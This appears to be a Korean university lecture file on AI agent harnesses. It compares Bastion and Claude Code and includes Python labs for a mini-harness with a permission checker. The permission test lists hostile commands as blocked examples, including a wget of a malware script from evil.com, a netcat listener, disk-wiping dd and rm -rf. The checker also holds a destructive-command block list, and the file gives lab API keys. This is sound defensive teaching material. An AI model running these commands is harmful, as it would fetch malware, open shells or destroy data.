@@ -1,0 +1,1125 @@
+# Week 04: 에이전트 하네스 개론
+
+## 학습 목표
+- 에이전트 하네스(Harness)의 개념과 필요성을 이해한다
+- Client-side 하네스와 Server-side 하네스의 차이를 설명할 수 있다
+- 하네스의 7대 구성요소를 파악하고 각 역할을 구분한다
+- Bastion(Server-side)와 Claude Code(Client-side) 하네스를 비교 분석한다
+- 간단한 하네스 프레임워크를 직접 설계할 수 있다
+
+## 실습 환경 (6v6 4-tier, 공통)
+
+학생 PC 의 `~/.ssh/config` 의 ProxyJump 설정 후 다음 표 의 컨테이너 에 `ssh
+6v6-<name>` 으로 접속.
+
+| 컨테이너 | 6v6 IP | 역할 | 접속 |
+|---------|--------|------|------|
+| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh 6v6-bastion` (pw: ccc) |
+| fw (secu) | 10.20.30.1 | 방화벽/HAProxy/Suricata ext | `ssh 6v6-fw` |
+| web | 10.20.32.80 | Apache + ModSecurity + JuiceShop | `ssh 6v6-web` |
+| siem | 10.20.32.100 | Wazuh manager + alerts.json | `ssh 6v6-siem` |
+| attacker | 10.20.30.202 | pen-test 도구 | `ssh 6v6-attacker` |
+
+**Bastion API:** `http://192.168.0.103:8003` / Key: `ccc-api-key-2026`
+**CCC API:** `http://localhost:9100` / Key: `ccc-api-key-2026`
+
+## 강의 시간 배분 (3시간)
+
+| 시간 | 내용 | 유형 |
+|------|------|------|
+| 0:00-0:30 | 이론: 하네스란 무엇인가 (Part 1) | 강의 |
+| 0:30-0:55 | 이론: 7대 구성요소와 하네스 비교 (Part 2) | 강의/토론 |
+| 0:55-1:05 | 휴식 | - |
+| 1:05-1:50 | 실습: 미니 하네스 프레임워크 구현 (Part 3) | 실습 |
+| 1:50-2:35 | 실습: Bastion 하네스 탐색 (Part 4) | 실습 |
+| 2:35-2:45 | 휴식 | - |
+| 2:45-3:15 | 실습: Claude Code 하네스 구조 분석 (Part 5) | 실습 |
+| 3:15-3:30 | 퀴즈 + 과제 안내 (Part 6) | 퀴즈 |
+
+---
+
+## 용어 해설 (AI보안에이전트 과목)
+
+| 용어 | 영문 | 설명 | 비유 |
+|------|------|------|------|
+| **하네스** | Harness | 에이전트의 실행 환경·제어 프레임워크 | 마구(馬具) — 말을 안전하게 제어 |
+| **Client-side 하네스** | Client-side Harness | 사용자 단말에서 실행되는 에이전트 하네스 | 개인 비서 |
+| **Server-side 하네스** | Server-side Harness | 서버에서 운영되는 중앙 집중식 하네스 | 중앙 관제센터 |
+| **Tool** | Tool | 에이전트가 사용하는 외부 기능/함수 | 공구함의 도구 |
+| **Skill** | Skill | 복합 도구를 묶은 고수준 능력 | 자격증 (여러 기술의 조합) |
+| **Hook** | Hook | 특정 이벤트 전후에 자동 실행되는 코드 | 문 앞의 센서 알람 |
+| **Memory** | Memory | 에이전트의 장기/단기 기억 저장소 | 업무 노트 |
+| **Agent** | Agent | 자율적으로 작업을 수행하는 실행 단위 | 현장 요원 |
+| **Task** | Task | 에이전트에게 할당된 개별 작업 단위 | 업무 티켓 |
+| **Permission** | Permission | 에이전트의 행동 범위를 제한하는 규칙 | 출입 권한 카드 |
+| **Orchestration** | Orchestration | 여러 에이전트/도구를 조율하는 행위 | 지휘자의 지휘 |
+| **CLAUDE.md** | CLAUDE.md | Claude Code에서 프로젝트 규칙을 정의하는 파일 | 프로젝트 헌법 |
+| **MCP** | Model Context Protocol | LLM에 외부 도구/데이터를 연결하는 프로토콜 | USB 허브 |
+| **SubAgent** | SubAgent | 원격 서버에서 명령을 실행하는 하위 에이전트 | 현장 파견 요원 |
+| **Playbook** | Playbook | 사전 정의된 작업 절차 | 작전 교범 |
+| **PoW** | Proof of Work | 작업 증명 메커니즘 | 공사 완료 확인서 |
+| **dry_run** | Dry Run | 실제 실행 없이 시뮬레이션만 수행 | 예행 연습 |
+
+---
+
+## Part 1: 하네스란 무엇인가 (30분) — 이론
+
+### 1.1 에이전트 하네스의 정의
+
+**하네스(Harness)** 는 AI 에이전트를 **안전하게 제어하고 실행하는 프레임워크**이다.
+
+LLM 자체는 텍스트만 생성한다. 하네스가 다음을 제공한다:
+- **도구 연결**: LLM이 외부 시스템과 상호작용할 수 있게 함
+- **실행 제어**: 에이전트의 행동 범위를 제한
+- **상태 관리**: 대화 기록, 작업 진행 상황 추적
+- **안전 장치**: 위험한 행동 차단, 승인 요청
+
+```
+  에이전트 하네스
+  |  Tools  |  |  Skills  |  |  Memory  |
+  |  LLM (Brain)  |
+  |  Hooks  |  |  Tasks  |  |Permissions|
+  |  Agents (실행 단위)  |
+```
+
+### 1.2 왜 하네스가 필요한가?
+
+| 문제 | 하네스 없이 | 하네스 있으면 |
+|------|-----------|-------------|
+| 보안 | LLM이 rm -rf / 실행 가능 | Permission으로 차단 |
+| 추적 | 무엇을 했는지 기록 없음 | Evidence/PoW로 모든 행동 기록 |
+| 일관성 | 매번 다른 방식으로 작업 | Playbook으로 표준화 |
+| 확장 | 단일 서버에서만 작동 | SubAgent로 다중 서버 제어 |
+| 협업 | 한 명만 사용 가능 | 여러 사용자/에이전트 동시 운영 |
+
+### 1.3 Client-side vs Server-side
+
+| 구분 | Client-side | Server-side |
+|------|------------|------------|
+| 대표 | Claude Code, Cursor | Bastion, LangGraph |
+| 실행 위치 | 사용자 로컬 PC | 원격 서버 |
+| 제어 방식 | 사용자가 실시간 확인 | API/정책으로 자동 제어 |
+| 적합한 작업 | 개발, 코드 리뷰, 탐색 | 인프라 운영, 정기 점검, 자동 대응 |
+| 안전 장치 | 사용자 승인 프롬프트 | Permission + dry_run + PoW |
+| 상태 저장 | 로컬 파일/메모리 | 데이터베이스 |
+| 다중 서버 | SSH/MCP로 접근 | SubAgent 분산 실행 |
+
+---
+
+## Part 2: 7대 구성요소와 하네스 비교 (25분) — 이론/토론
+
+### 2.1 하네스의 7대 구성요소
+
+| # | 구성요소 | 역할 | Bastion | Claude Code |
+|---|---------|------|---------|-------------|
+| 1 | **Tools** | 외부 시스템과 상호작용 | run_command, fetch_log, query_metric | Bash, Read, Write, Grep |
+| 2 | **Skills** | 복합 도구의 고수준 조합 | probe_linux_host, analyze_wazuh_alert | MCP 서버 |
+| 3 | **Hooks** | 이벤트 전후 자동 실행 | (내장: PoW 자동 기록) | pre/post command hooks |
+| 4 | **Memory** | 컨텍스트·기록 유지 | PostgreSQL DB | CLAUDE.md, .claude/ |
+| 5 | **Agents** | 실행 주체 | SubAgent (원격) | Claude (로컬) |
+| 6 | **Tasks** | 작업 단위 | execute-plan tasks 배열 | 사용자 대화 턴 |
+| 7 | **Permissions** | 행동 제한 | risk_level, dry_run | .claude/settings.json |
+
+### 2.2 하네스 비교: Bastion vs Claude Code
+
+```
+  [Client-side] Claude Code
+  사용자 ←→ Claude LLM ←→ Tools (Bash/Read/Write)
+  → CLAUDE.md (규칙)
+  → MCP 서버 (외부 도구)
+  → Hooks (이벤트)
+  장점: 실시간 대화, 유연한 탐색
+  단점: 로컬 실행만, 자동화 어려움
+
+  [Server-side] Bastion
+  Claude/사용자 → Manager API → SubAgent(secu)
+  → SubAgent(web)
+  → SubAgent(siem)
+  Manager: Project → Plan → Execute → Evidence → Report
+  Playbook, PoW, RL, 스케줄러
+  장점: 다중 서버, 자동화, 감사 추적
+  단점: API 호출 필요, 설정 복잡
+```
+
+### 2.3 토론: 어떤 하네스를 언제 사용하는가?
+
+| 시나리오 | 추천 하네스 | 이유 |
+|---------|-----------|------|
+| 코드 리뷰/개발 | Claude Code | 대화형, 파일 편집 |
+| 정기 보안 점검 | Bastion | 스케줄, 자동화, 증적 |
+| 사고 대응 | 하이브리드 | Claude Code로 분석 + Bastion로 실행 |
+| 규정 준수 감사 | Bastion | PoW 증적, 보고서 |
+
+---
+
+## Part 3: 미니 하네스 프레임워크 구현 (45분) — 실습
+
+### 3.1 Python으로 미니 하네스 설계
+
+> **실습 목적**: 에이전트가 메모리를 활용하여 과거 대화/행동을 참조하고 맥락을 유지하는 기능을 구현하기 위해 수행한다
+>
+> **배우는 것**: 단기 메모리(대화 이력)와 장기 메모리(요약/검색)의 차이, 컨텍스트 윈도우 관리 전략을 이해한다
+>
+> **결과 해석**: 에이전트가 과거 대화를 참조하여 일관된 응답을 하면 메모리가 정상 동작하는 것이다
+>
+> **실전 활용**: 인시던트 타임라인 추적 에이전트, 반복 작업의 맥락 유지, 장기 보안 모니터링 에이전트 개발에 활용한다
+
+```bash
+# 작업 디렉토리 생성
+mkdir -p ~/lab/week04
+
+cat > ~/lab/week04/mini_harness.py << 'PYEOF'
+"""
+Week 04 실습: 미니 에이전트 하네스
+7대 구성요소를 모두 포함하는 간단한 하네스를 구현한다.
+"""
+import requests
+import json
+import subprocess
+import datetime
+import os
+
+OLLAMA_URL = "http://10.20.30.200:11434/v1/chat/completions"
+MODEL = "llama3.1:8b"
+
+# ============================================================
+# 1. TOOLS — 에이전트가 사용하는 도구
+# ============================================================
+class ToolRegistry:
+    """도구 등록소: 에이전트가 사용할 수 있는 도구를 관리"""
+
+    def __init__(self):
+        self._tools = {}
+
+    def register(self, name: str, func, description: str, params: dict):
+        """도구 등록"""
+        self._tools[name] = {
+            "func": func,
+            "description": description,
+            "params": params,
+        }
+
+    def execute(self, name: str, args: dict) -> str:
+        """도구 실행"""
+        if name not in self._tools:
+            return f"오류: '{name}' 도구를 찾을 수 없습니다"
+        return self._tools[name]["func"](**args)
+
+    def get_descriptions(self) -> str:
+        """도구 설명 목록 (프롬프트에 포함용)"""
+        lines = []
+        for name, info in self._tools.items():
+            params_str = ", ".join(f"{k}:{v}" for k, v in info["params"].items())
+            lines.append(f"- {name}({params_str}): {info['description']}")
+        return "\n".join(lines)
+
+# 도구 함수 정의
+def tool_run_command(command: str) -> str:
+    """로컬 쉘 명령 실행"""
+    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=15)
+    return result.stdout.strip() or result.stderr.strip()
+
+def tool_check_disk(path: str = "/") -> str:
+    """디스크 사용량 확인"""
+    return tool_run_command(f"df -h {path}")
+
+def tool_check_ports() -> str:
+    """열린 포트 확인"""
+    return tool_run_command("ss -tlnp | head -15")
+
+# ============================================================
+# 2. SKILLS — 복합 도구 조합
+# ============================================================
+class SkillRegistry:
+    """스킬 등록소: 여러 도구를 조합한 고수준 능력"""
+
+    def __init__(self, tools: ToolRegistry):
+        self._skills = {}
+        self._tools = tools
+
+    def register(self, name: str, steps: list, description: str):
+        """스킬 등록 (steps: [(tool_name, args), ...])"""
+        self._skills[name] = {"steps": steps, "description": description}
+
+    def execute(self, name: str) -> list:
+        """스킬 실행: 모든 도구를 순차 실행"""
+        skill = self._skills.get(name)
+        if not skill:
+            return [f"오류: '{name}' 스킬이 없습니다"]
+        results = []
+        for tool_name, args in skill["steps"]:
+            result = self._tools.execute(tool_name, args)
+            results.append({"tool": tool_name, "result": result})
+        return results
+
+# ============================================================
+# 3. HOOKS — 이벤트 전후 실행
+# ============================================================
+class HookManager:
+    """이벤트 훅 관리자"""
+
+    def __init__(self):
+        self._hooks = {"before_execute": [], "after_execute": [], "on_error": []}
+
+    def register(self, event: str, func):
+        """훅 등록"""
+        if event in self._hooks:
+            self._hooks[event].append(func)
+
+    def trigger(self, event: str, context: dict):
+        """훅 실행"""
+        for func in self._hooks.get(event, []):
+            func(context)
+
+# ============================================================
+# 4. MEMORY — 기억 저장소
+# ============================================================
+class Memory:
+    """에이전트 메모리: 대화 기록과 작업 이력 관리"""
+
+    def __init__(self):
+        self.conversation = []
+        self.task_history = []
+
+    def add_message(self, role: str, content: str):
+        """대화 기록 추가"""
+        self.conversation.append({"role": role, "content": content})
+
+    def add_task_result(self, task: dict):
+        """작업 결과 기록"""
+        task["timestamp"] = datetime.datetime.now().isoformat()
+        self.task_history.append(task)
+
+    def get_context(self) -> str:
+        """기억 요약 반환"""
+        if not self.task_history:
+            return "이전 작업 이력 없음"
+        recent = self.task_history[-3:]
+        return json.dumps(recent, indent=2, ensure_ascii=False)
+
+# ============================================================
+# 5. PERMISSIONS — 행동 제한
+# ============================================================
+class PermissionManager:
+    """권한 관리자: 에이전트 행동 제한"""
+
+    def __init__(self):
+        # 차단할 명령 패턴
+        self.blocked_patterns = [
+            "rm -rf", "mkfs", "dd if=", "shutdown", "reboot",
+            "DROP TABLE", "DELETE FROM", "> /dev/sda",
+        ]
+        # 허용할 명령 접두사
+        self.allowed_prefixes = [
+            "df", "free", "ps", "ss", "cat", "head", "tail",
+            "grep", "find", "ls", "uptime", "who", "last",
+            "nft list", "systemctl status",
+        ]
+
+    def check(self, command: str) -> tuple:
+        """명령 실행 가능 여부 확인 → (허용여부, 이유)"""
+        # 차단 패턴 검사
+        for pattern in self.blocked_patterns:
+            if pattern.lower() in command.lower():
+                return False, f"차단됨: '{pattern}' 패턴 탐지"
+        # 허용 접두사 검사
+        for prefix in self.allowed_prefixes:
+            if command.strip().startswith(prefix):
+                return True, "허용된 명령"
+        return False, f"미허용 명령: 화이트리스트에 없음"
+
+# ============================================================
+# 6. TASK — 작업 단위
+# ============================================================
+class Task:
+    """작업 단위"""
+
+    def __init__(self, instruction: str, risk_level: str = "low"):
+        self.instruction = instruction
+        self.risk_level = risk_level
+        self.status = "pending"
+        self.result = None
+
+# ============================================================
+# 7. AGENT — 하네스 통합 실행
+# ============================================================
+class MiniAgent:
+    """미니 에이전트: 7대 구성요소를 통합"""
+
+    def __init__(self):
+        # 구성요소 초기화
+        self.tools = ToolRegistry()
+        self.skills = SkillRegistry(self.tools)
+        self.hooks = HookManager()
+        self.memory = Memory()
+        self.permissions = PermissionManager()
+
+        # 도구 등록
+        self.tools.register("run_command", tool_run_command, "쉘 명령 실행", {"command": "str"})
+        self.tools.register("check_disk", tool_check_disk, "디스크 확인", {"path": "str"})
+        self.tools.register("check_ports", tool_check_ports, "포트 확인", {})
+
+        # 스킬 등록
+        self.skills.register("basic_health_check", [
+            ("check_disk", {"path": "/"}),
+            ("check_ports", {}),
+            ("run_command", {"command": "uptime"}),
+        ], "기본 서버 상태 점검")
+
+        # 훅 등록
+        self.hooks.register("before_execute", lambda ctx: print(f"  [HOOK] 실행 시작: {ctx.get('command','')}"))
+        self.hooks.register("after_execute", lambda ctx: print(f"  [HOOK] 실행 완료: {ctx.get('status','')}"))
+
+    def execute_task(self, task: Task) -> dict:
+        """태스크 실행"""
+        print(f"\n[TASK] {task.instruction} (risk: {task.risk_level})")
+
+        # 권한 확인
+        allowed, reason = self.permissions.check(task.instruction)
+        if not allowed:
+            task.status = "blocked"
+            task.result = reason
+            print(f"  [PERMISSION] 차단: {reason}")
+            return {"status": "blocked", "reason": reason}
+
+        # before 훅 실행
+        self.hooks.trigger("before_execute", {"command": task.instruction})
+
+        # 도구 실행
+        result = self.tools.execute("run_command", {"command": task.instruction})
+        task.status = "completed"
+        task.result = result
+
+        # after 훅 실행
+        self.hooks.trigger("after_execute", {"status": "success"})
+
+        # 메모리에 기록
+        self.memory.add_task_result({
+            "instruction": task.instruction,
+            "result": result[:200],
+            "status": "completed"
+        })
+
+        return {"status": "completed", "result": result}
+
+    def run_skill(self, skill_name: str) -> list:
+        """스킬 실행"""
+        print(f"\n[SKILL] {skill_name}")
+        results = self.skills.execute(skill_name)
+        for r in results:
+            self.memory.add_task_result(r)
+        return results
+
+    def ask_llm(self, question: str) -> str:
+        """LLM에게 질문 (메모리 컨텍스트 포함)"""
+        context = self.memory.get_context()
+        self.memory.add_message("user", question)
+
+        resp = requests.post(OLLAMA_URL, json={
+            "model": MODEL,
+            "messages": [
+                {"role": "system", "content": f"보안 관리자 AI. 이전 작업 기록:\n{context}"},
+                {"role": "user", "content": question}
+            ],
+            "temperature": 0.2,
+        }, timeout=120)
+        answer = resp.json()["choices"][0]["message"]["content"]
+        self.memory.add_message("assistant", answer)
+        return answer
+
+# ============================================================
+# 메인 실행
+# ============================================================
+if __name__ == "__main__":
+    print("=" * 60)
+    print("미니 에이전트 하네스 — 7대 구성요소 데모")
+    print("=" * 60)
+
+    agent = MiniAgent()
+
+    # 1. 스킬 실행
+    print("\n>>> 스킬: basic_health_check")
+    results = agent.run_skill("basic_health_check")
+    for r in results:
+        print(f"  {r['tool']}: {r['result'][:100]}")
+
+    # 2. 허용된 태스크
+    t1 = Task("df -h /", risk_level="low")
+    agent.execute_task(t1)
+    print(f"  결과: {t1.result[:100]}")
+
+    # 3. 차단된 태스크
+    t2 = Task("rm -rf /tmp/*", risk_level="critical")
+    agent.execute_task(t2)
+
+    # 4. LLM 분석 (메모리 활용)
+    print("\n>>> LLM에게 분석 요청 (이전 작업 기록 포함)")
+    answer = agent.ask_llm("지금까지 수행한 점검 결과를 종합 분석해줘")
+    print(f"  LLM: {answer[:300]}")
+
+    # 5. 메모리 확인
+    print(f"\n>>> 메모리 상태")
+    print(f"  작업 이력: {len(agent.memory.task_history)}건")
+    print(f"  대화 기록: {len(agent.memory.conversation)}턴")
+PYEOF
+
+# 미니 하네스 실행
+python3 ~/lab/week04/mini_harness.py
+```
+
+### 3.2 Permission 테스트
+
+```bash
+cat > ~/lab/week04/permission_test.py << 'PYEOF'
+"""
+Week 04 실습: Permission 시스템 테스트
+다양한 명령에 대한 권한 검사를 수행한다.
+"""
+import sys
+sys.path.insert(0, "/root/lab/week04")
+from mini_harness import PermissionManager
+
+pm = PermissionManager()
+
+# 테스트할 명령 목록
+test_commands = [
+    # 안전한 명령 (허용 예상)
+    "df -h /",
+    "ps aux | head -10",
+    "ss -tlnp",
+    "cat /etc/hostname",
+    "uptime",
+    "nft list ruleset",
+    "systemctl status sshd",
+    # 위험한 명령 (차단 예상)
+    "rm -rf /var/log",
+    "shutdown -h now",
+    "dd if=/dev/zero of=/dev/sda",
+    "DROP TABLE users;",
+    "mkfs.ext4 /dev/sdb1",
+    # 미분류 명령 (차단 예상 — 화이트리스트에 없음)
+    "wget http://evil.com/malware.sh",
+    "curl http://10.0.0.1/admin",
+    "nc -lvp 4444",
+    "python3 -c 'import os; os.system(\"id\")'",
+]
+
+print(f"{'명령':<45} {'결과':<8} {'이유'}")
+print("-" * 90)
+for cmd in test_commands:
+    allowed, reason = pm.check(cmd)
+    status = "허용" if allowed else "차단"
+    # 결과를 색상으로 구분
+    print(f"{cmd:<45} {status:<8} {reason}")
+PYEOF
+
+# Permission 테스트 실행
+python3 ~/lab/week04/permission_test.py
+```
+
+---
+
+## Part 4: Bastion 하네스 탐색 (45분) — 실습
+
+### 4.1 Bastion의 하네스 구성요소 확인
+
+```bash
+# Bastion Manager API 상태 확인
+curl -s -H "X-API-Key: ccc-api-key-2026" \
+  http://localhost:9100/health | python3 -m json.tool
+
+# 등록된 Tools 확인 (SubAgent 런타임)
+curl -s http://localhost:8002/tools 2>/dev/null | python3 -m json.tool || \
+  echo "SubAgent 미기동 — 아래 명령으로 확인"
+
+# Skills 목록 확인
+curl -s http://localhost:8002/skills 2>/dev/null | python3 -m json.tool || \
+  echo "SubAgent 미기동"
+```
+
+### 4.2 Bastion 하네스를 통한 작업 실행
+
+```bash
+# 1. 프로젝트 생성 (하네스 진입점)
+PROJECT=$(curl -s -X POST http://localhost:9100/projects \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: ccc-api-key-2026" \
+  -d '{
+    "name": "week04-harness-demo",
+    "request_text": "하네스 구성요소 탐색 실습",
+    "master_mode": "external"
+  }')
+# 프로젝트 ID 추출
+PID=$(echo $PROJECT | python3 -c "import sys,json; print(json.load(sys.stdin)['project']['id'])")
+echo "Project ID: $PID"
+
+# 2. Stage 전환 (Task 생명주기)
+# plan 단계로 전환
+curl -s -X POST http://localhost:9100/projects/${PID}/plan \
+  -H "X-API-Key: ccc-api-key-2026" | python3 -c "import sys,json; print('Stage:', json.load(sys.stdin).get('stage'))"
+
+# execute 단계로 전환
+curl -s -X POST http://localhost:9100/projects/${PID}/execute \
+  -H "X-API-Key: ccc-api-key-2026" | python3 -c "import sys,json; print('Stage:', json.load(sys.stdin).get('stage'))"
+```
+
+### 4.3 execute-plan으로 Task 배열 실행
+
+```bash
+# execute-plan: 여러 Task를 한 번에 실행 (Bastion의 핵심 기능)
+curl -s -X POST http://localhost:9100/projects/${PID}/execute-plan \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: ccc-api-key-2026" \
+  -d '{
+    "tasks": [
+      {
+        "order": 1,
+        "instruction_prompt": "hostname && uptime",
+        "risk_level": "low",
+        "subagent_url": "http://localhost:8002"
+      },
+      {
+        "order": 2,
+        "instruction_prompt": "df -h / | tail -1",
+        "risk_level": "low",
+        "subagent_url": "http://localhost:8002"
+      },
+      {
+        "order": 3,
+        "instruction_prompt": "ss -tlnp | grep -c LISTEN",
+        "risk_level": "low",
+        "subagent_url": "http://localhost:8002"
+      }
+    ],
+    "subagent_url": "http://localhost:8002"
+  }' | python3 -m json.tool
+```
+
+### 4.4 Evidence와 PoW 확인 (Memory + Hook)
+
+```bash
+# Evidence 요약 (하네스의 Memory 역할)
+curl -s -H "X-API-Key: ccc-api-key-2026" \
+  http://localhost:9100/projects/${PID}/evidence/summary | python3 -m json.tool
+
+# PoW 블록 확인 (하네스의 Hook 역할 — 자동 기록)
+curl -s -H "X-API-Key: ccc-api-key-2026" \
+  "http://localhost:9100/pow/blocks?agent_id=http://localhost:8002" | python3 -m json.tool
+
+# PoW 체인 무결성 검증
+curl -s -H "X-API-Key: ccc-api-key-2026" \
+  "http://localhost:9100/pow/verify?agent_id=http://localhost:8002" | python3 -m json.tool
+```
+
+### 4.5 완료 보고서 (Agent output)
+
+```bash
+# 완료 보고서 작성
+curl -s -X POST http://localhost:9100/projects/${PID}/completion-report \
+  -H "Content-Type: application/json" \
+  -H "X-API-Key: ccc-api-key-2026" \
+  -d '{
+    "summary": "Week04 하네스 탐색 실습 완료",
+    "outcome": "success",
+    "work_details": [
+      "Bastion 7대 구성요소 확인",
+      "execute-plan으로 3개 태스크 실행",
+      "PoW 증적 기록 확인"
+    ]
+  }' | python3 -m json.tool
+
+# 프로젝트 전체 Replay (작업 재현)
+curl -s -H "X-API-Key: ccc-api-key-2026" \
+  http://localhost:9100/projects/${PID}/replay | python3 -m json.tool
+```
+
+---
+
+## Part 5: Claude Code 하네스 구조 분석 (30분) — 실습
+
+### 5.1 Claude Code의 구성 파일 분석
+
+```bash
+# Claude Code 프로젝트 설정 파일 확인 (CLAUDE.md)
+cat /home/bastion/bastion/CLAUDE.md | head -60
+
+# Claude Code 사용자 설정 디렉토리 확인
+ls -la ~/.claude/ 2>/dev/null || echo ".claude/ 디렉토리 없음 — Claude Code 미설치"
+```
+
+### 5.2 CLAUDE.md 구조 이해 실습
+
+```bash
+cat > ~/lab/week04/claudemd_anatomy.py << 'PYEOF'
+"""
+Week 04 실습: CLAUDE.md 구조 분석
+Claude Code 하네스의 핵심 설정 파일을 분석한다.
+"""
+import re
+
+# CLAUDE.md 읽기
+claudemd_path = "/home/bastion/bastion/CLAUDE.md"
+with open(claudemd_path, "r") as f:
+    content = f.read()
+
+# 섹션 추출
+sections = re.findall(r'^## (.+)$', content, re.MULTILINE)
+print("CLAUDE.md 섹션 목록:")
+for i, s in enumerate(sections, 1):
+    print(f"  {i}. {s}")
+
+# 하네스 구성요소 매핑
+print("\n하네스 구성요소 ↔ CLAUDE.md 매핑:")
+mappings = [
+    ("Tools", "등록된 Tool/Skill 섹션 — run_command, fetch_log 등"),
+    ("Skills", "등록된 Tool/Skill 섹션 — probe_linux_host, analyze_wazuh_alert 등"),
+    ("Hooks", "PoW & 보상 섹션 — execute-plan 시 자동 PoW 기록"),
+    ("Memory", "상세 문서 섹션 — DB에 evidence 기록"),
+    ("Agents", "인프라 구성 섹션 — SubAgent 목록"),
+    ("Tasks", "핵심 작업 흐름 — execute-plan tasks 배열"),
+    ("Permissions", "중요 규칙 섹션 — risk_level, dry_run, 파괴적 명령 금지"),
+]
+for component, mapping in mappings:
+    print(f"  [{component:12s}] → {mapping}")
+
+# 규칙 추출
+rules = re.findall(r'- (.+파괴.+|.+금지.+|.+필수.+|.+반드시.+)', content)
+print(f"\n안전 규칙 ({len(rules)}건):")
+for r in rules[:5]:
+    print(f"  - {r.strip()}")
+PYEOF
+
+# CLAUDE.md 분석 실행
+python3 ~/lab/week04/claudemd_anatomy.py
+```
+
+### 5.3 하네스 비교표 작성
+
+```bash
+cat > ~/lab/week04/harness_comparison.py << 'PYEOF'
+"""
+Week 04 실습: 하네스 비교표 생성
+Bastion와 Claude Code의 하네스를 7대 구성요소별로 비교한다.
+"""
+import json
+
+comparison = {
+    "comparison_title": "에이전트 하네스 비교: Bastion vs Claude Code",
+    "components": [
+        {
+            "name": "Tools",
+            "bastion": {
+                "implementation": "Manager API의 dispatch/execute-plan → SubAgent 실행",
+                "examples": ["run_command", "fetch_log", "query_metric", "read_file"],
+                "extensibility": "Python 함수로 Tool 추가 가능"
+            },
+            "claude_code": {
+                "implementation": "내장 도구 (Bash, Read, Write, Grep, Glob 등)",
+                "examples": ["Bash", "Read", "Write", "Edit", "Grep", "WebFetch"],
+                "extensibility": "MCP 서버로 확장"
+            }
+        },
+        {
+            "name": "Skills",
+            "bastion": {
+                "implementation": "Playbook + 등록 Skill",
+                "examples": ["probe_linux_host", "check_tls_cert", "analyze_wazuh_alert_burst"],
+            },
+            "claude_code": {
+                "implementation": "MCP 서버 + 슬래시 명령",
+                "examples": ["MCP tools", "/commit", "/review-pr"],
+            }
+        },
+        {
+            "name": "Hooks",
+            "bastion": {
+                "implementation": "PoW 자동 기록, 보상 자동 계산",
+                "trigger": "execute-plan 실행 시",
+            },
+            "claude_code": {
+                "implementation": "settings.json hooks 배열",
+                "trigger": "명령 실행 전/후, 알림 전후",
+            }
+        },
+        {
+            "name": "Memory",
+            "bastion": {
+                "storage": "PostgreSQL DB",
+                "scope": "프로젝트 단위 evidence, PoW 블록",
+            },
+            "claude_code": {
+                "storage": "CLAUDE.md, .claude/ 디렉토리, MEMORY.md",
+                "scope": "프로젝트/사용자 단위",
+            }
+        },
+        {
+            "name": "Permissions",
+            "bastion": {
+                "mechanism": "risk_level (low/medium/high/critical), dry_run",
+                "enforcement": "critical → 자동 dry_run, confirmed:true로 해제",
+            },
+            "claude_code": {
+                "mechanism": "settings.json allow/deny 패턴",
+                "enforcement": "사용자 승인 프롬프트",
+            }
+        },
+    ]
+}
+
+# 결과 저장
+with open("/root/lab/week04/harness_comparison.json", "w") as f:
+    json.dump(comparison, f, indent=2, ensure_ascii=False)
+
+# 표 형태로 출력
+print(f"{'구성요소':<12} {'Bastion':^35} {'Claude Code':^35}")
+print("=" * 82)
+for comp in comparison["components"]:
+    ops_desc = comp["bastion"].get("implementation", comp["bastion"].get("mechanism", ""))[:32]
+    cc_desc = comp["claude_code"].get("implementation", comp["claude_code"].get("mechanism", ""))[:32]
+    print(f"{comp['name']:<12} {ops_desc:<35} {cc_desc:<35}")
+PYEOF
+
+# 비교표 생성
+python3 ~/lab/week04/harness_comparison.py
+```
+
+---
+
+## Part 6: 과제 (15분)
+
+### 과제
+
+**[과제] 미니 하네스 확장**
+
+1. `mini_harness.py`에 다음을 추가하라:
+   - 새 Tool 2개: `check_ssh_config`(SSH 설정 확인), `check_crontab`(크론 작업 확인)
+   - 새 Skill 1개: `security_audit` (위 도구들을 조합한 보안 감사)
+   - Permission에 `risk_level` 개념 추가 (low/medium/high/critical)
+
+2. LLM에게 "보안 감사를 실행해줘"라고 요청하여 스킬이 자동 실행되도록 구현하라.
+
+3. 결과를 `~/lab/week04/homework.md`에 정리하라.
+
+**제출물:** 수정된 `mini_harness.py` + `homework.md`
+
+---
+
+> **다음 주 예고:** Week 05에서는 Bastion을 Server-side 하네스로 본격 구축한다. Native Mode(Master Service)를 설정하고, Ollama를 연동하여 자연어→실행 파이프라인을 구축한다.
+
+---
+
+## 📂 실습 참조 파일 가이드
+
+> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.
+
+### CCC Bastion Agent
+> **역할:** CCC 자율 운영 에이전트 — 스킬/플레이북/경험 학습  
+> **실행 위치:** `bastion (10.20.30.201)`  
+> **접속/호출:** TUI `./dev.sh bastion`, API `http://10.20.30.200:11434`
+
+**주요 경로·파일**
+
+| 경로 | 역할 |
+|------|------|
+| `packages/bastion/agent.py` | 메인 에이전트 루프 |
+| `packages/bastion/skills.py` | 스킬 정의 |
+| `packages/bastion/playbooks/` | 정적 플레이북 YAML |
+| `data/bastion/experience/` | 수집된 경험 (pass/fail) |
+
+**핵심 설정·키**
+
+- `LLM_BASE_URL / LLM_MODEL` — Ollama 연결
+- `CCC_API_KEY` — ccc-api 인증
+- `max_retry=2` — 실패 시 self-correction 재시도
+
+**로그·확인 명령**
+
+- ``docs/test-status.md`` — 현재 테스트 진척 요약
+- ``bastion_test_progress.json`` — 스텝별 pass/fail 원시
+
+**UI / CLI 요점**
+
+- 대화형 TUI 프롬프트 — 자연어 지시 → 계획 → 실행 → 검증
+- `/a2a/mission` (API) — 자율 미션 실행
+- Experience→Playbook 승격 — 반복 성공 패턴 저장
+
+> **해석 팁.** 실패 시 output을 분석해 **근본 원인 교정**이 설계의 핵심. 증상 회피/땜빵은 금지.
+
+---
+
+## 실제 사례 (WitFoo Precinct 6 — 에이전트 하네스 개론)
+
+> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
+> 본 lecture *에이전트 하네스 (harness) 의 정의와 종류* 학습 항목 매칭.
+
+### Harness = "에이전트의 ReAct loop + tool + memory 를 통합한 환경"
+
+*하네스* 는 에이전트가 *동작하는 환경* 이다. 종류는 — *서버 사이드 (Bastion 같은 standalone)*, *클라이언트 사이드 (Claude Code 같은 IDE 통합)*, *embedded (앱 내 sub-agent)*. dataset 환경에서 — Bastion 은 서버 사이드 하네스로 구현.
+
+```mermaid
+graph TB
